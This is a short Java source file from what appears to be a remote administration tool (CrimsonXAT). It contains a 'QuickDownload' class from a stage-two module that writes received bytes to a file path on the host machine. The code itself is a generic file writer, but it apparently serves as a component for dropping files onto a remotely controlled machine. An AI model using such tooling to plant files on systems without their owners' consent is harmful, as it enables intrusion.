/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.permajar.stage2.modules;



import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;

import subterranean.crimson.universal.Reporter;

public class QuickDownload {

	public static void run(String path, byte[] data) {
		try {
			File file = new File(path);
			file.createNewFile();

			OutputStream os = new FileOutputStream(file);
			os.write(data);
			os.close();
		} catch (FileNotFoundException e) {
			System.out.println("Could not find: " + path);

			Reporter.report(e);

			e.printStackTrace();
		} catch (IOException e) {
			System.out.println("Could not write file... Permissions problem?");

			Reporter.report(e);

			e.printStackTrace();
		}
	}

}
